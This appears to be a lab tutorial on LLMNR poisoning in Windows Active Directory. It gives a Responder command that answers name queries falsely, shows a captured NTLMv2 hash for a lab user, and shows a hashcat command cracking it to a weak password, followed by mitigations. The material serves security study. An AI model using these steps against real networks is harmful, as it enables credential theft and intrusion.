# LLMNR Poisoning

### What is LLMNR?

LLMNR (Link-Local Multicast Name Resolution) is a protocol used in Windows environments to resolve hostnames on a local network when DNS queries fail. It allows systems to perform name resolution without relying on a DNS server by broadcasting queries to nearby machines. While intended as a fallback mechanism for convenience, it introduces significant security risks.

### What can go wrong here?

**attacker pretends to be the server, capturing credentials**

- LLMNR poisoning is an attack technique often used as an initial vector in Active Directory compromises. An attacker connected to the same network listens for LLMNR queries and responds with false information, tricking victims into sending authentication requests to the attacker’s machine. This enables the capture of NTLMv2 hashes, which can then be brute-forced offline or relayed to other services for lateral movement and privilege escalation.

- In normal NTLM authentication, the client talks to the real server and the DC validates. Using a tool like Responder, the client talks to the attacker, so he captures its NTLM authentication before the DC is ever involved.

- The poisoning part is the attacker tricking the victim into sending its NTLM authentication to him by falsely answering its broadcast name resolution request.

### Attack Requirements

The main requirements for LLMNR poisoning are that LLMNR (or its predecessor, NBT-NS) is enabled in the network, that DNS resolution fails for the queried hostname, and that the attacker has local network access to intercept and respond to the broadcast traffic. These conditions make it a common and effective entry point in poorly hardened Windows environments.

### LLMNR Poisoning in AD

#### Step 1: Attacker runs responder

```
sudo responder -I eth0 -dw
```

#### Step 2: An Event Occurs in the Network and Triggers LLMNR

When a LLMNR event occurs in the network and is maliciously responded to, the attacker will obtain sensitive information, including IP adress, domain, username and password hash of the victim.

In our lab scenario we simulated this by looking for `\\10.0.2.15` (attacker IP address) inside the windows machine top bar in files

```
[SMB] NTLMv2-SSP Client   : 10.0.2.16
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:4ebfcbf82597e3ff:A78E7AB8283CE22309010584338A7E84:0101000000000000801F0FF80615DC017567BB97800964B60000000002000800590031004D00570001001E00570049004E002D004E00440047004B005400430041004A004B005700370004003400570049004E002D004E00440047004B005400430041004A004B00570037002E00590031004D0057002E004C004F00430041004C0003001400590031004D0057002E004C004F00430041004C0005001400590031004D0057002E004C004F00430041004C0007000800801F0FF80615DC010600040002000000080030003000000000000000010000000020000035230AAA56834FA0EE49F096EF6EE63AEDB19B9D89DAFA365CC9D8A1C1CCF11D0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0030002E0032002E00310035000000000000000000
```

#### Step 3: Cracking the hash offline

We can attempt to take the victim's captured hash offline and crack it.

```
hashcat –m 5600 <hashfile.txt> <wordlist.txt> --show
```

5600 is for NTLMv2

```
FCASTLE::MARVEL:4ebfcbf82597e3ff:a78e7ab8283ce22309010584338a7e84:0101000000000000801f0ff80615dc017567bb97800964b60000000002000800590031004d00570001001e00570049004e002d004e00440047004b005400430041004a004b005700370004003400570049004e002d004e00440047004b005400430041004a004b00570037002e00590031004d0057002e004c004f00430041004c0003001400590031004d0057002e004c004f00430041004c0005001400590031004d0057002e004c004f00430041004c0007000800801f0ff80615dc010600040002000000080030003000000000000000010000000020000035230aaa56834fa0ee49f096ef6ee63aedb19b9d89dafa365cc9d8a1c1ccf11d0a0010000000000000000000000000000000000009001c0063006900660073002f00310030002e0030002e0032002e00310035000000000000000000:Password1!
```

### Mitigations

The primary mitigation strategy is to disable LLMNR and its predecessor NBT-NS across the environment, since they are rarely necessary in well-managed networks. Enforcing strong DNS infrastructure ensures that hosts do not fall back to insecure name resolution methods. Additionally, enforcing SMB signing and enabling Extended Protection for Authentication can reduce the effectiveness of relay attacks. Using strong password policies and multifactor authentication limits the value of captured hashes, while monitoring for suspicious authentication attempts and unusual broadcast traffic helps detect ongoing poisoning attempts. Network segmentation can also reduce the attacker’s ability to intercept and respond to LLMNR queries.

#### References

- [https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/](https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/)
